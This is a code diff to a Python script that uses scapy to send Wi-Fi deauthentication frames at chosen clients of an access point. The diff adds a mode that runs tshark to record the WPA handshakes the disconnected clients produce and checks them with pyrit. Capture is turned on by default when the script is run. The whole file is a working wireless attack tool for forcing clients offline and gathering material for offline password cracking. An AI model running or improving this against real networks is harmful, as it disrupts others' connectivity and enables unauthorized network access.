@@ -8,7 +8,13 @@ import atexit
 import argparse
 import types
 import os
+import subprocess
+import signal
+import sys
+import time
+
 import scapy.all as scapy
+from analyzr_core import AnalyzrCore
 
 
 class DeauthJammer(object):
@@ -18,13 +24,13 @@ class DeauthJammer(object):
         self._thread_event = threading.Event()
         self._thread_event.set()
         self._thread_lock = threading.Lock()
-        
+
         # scapy.conf.iface =
         atexit.register(self._on_end)
         scapy.conf.iface = iface
         scapy.conf.verb = 0  # Non-verbose mode
 
-    def jam(self, targets, packet_count=1):
+    def jam(self, targets, packet_count=1, capture_handshake=False, channel=1):
         self._threads_finished = 0
         self._threads = list()
 
@@ -34,6 +40,15 @@ class DeauthJammer(object):
             targets.append(old_targets)
 
         assert type(targets) is types.ListType
+
+        AnalyzrCore.set_channel(scapy.conf.iface, channel)
+
+        proc = None
+        capture_filename =  "capture_" + str(time.time()) + ".pcap"
+        if capture_handshake:
+            FNULL = open(os.devnull, 'w')
+            proc = subprocess.Popen(["tshark", "-i", scapy.conf.iface, "-w", capture_filename, "-f", "type mgt"], stdin=None,
+                                    stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients
 
         for target in targets:
             jamThread = threading.Thread(
@@ -46,6 +61,25 @@ class DeauthJammer(object):
             while self._threads_finished < len(targets):
                 for thread in self._threads:
                     thread.join(.1)
+
+            if capture_handshake:
+                proc.terminate()
+                proc.wait()
+
+                # validate the capture with pyrit
+                pyrit_output = ""
+                handshake_captured = True
+                try:
+                    pyrit_output = subprocess.check_output(["pyrit", "-r", capture_filename, "analyze"])
+                except subprocess.CalledProcessError:
+                    handshake_captured = False
+
+                return {
+                    "filename": capture_filename,
+                    "handshake_captured": handshake_captured, 
+                    "pyrit_output": pyrit_output
+                }
+
         except KeyboardInterrupt:
             self._on_end()
 
@@ -98,9 +132,6 @@ if __name__ == '__main__':
     parsed_options.count = int(parsed_options.count)
     parsed_options.channel = int(parsed_options.channel)
 
-    os.system("iwconfig %s channel %d" %
-              (parsed_options.iface, parsed_options.channel))
-    print "Switched to channel %d on interface %s" % (parsed_options.channel, parsed_options.iface)
-
     jammer = DeauthJammer(parsed_options.bssid, iface=parsed_options.iface)
-    jammer.jam(parsed_options.client_mac, packet_count=parsed_options.count)
+    print jammer.jam(parsed_options.client_mac, packet_count=parsed_options.count,
+               channel=parsed_options.channel, capture_handshake=True)
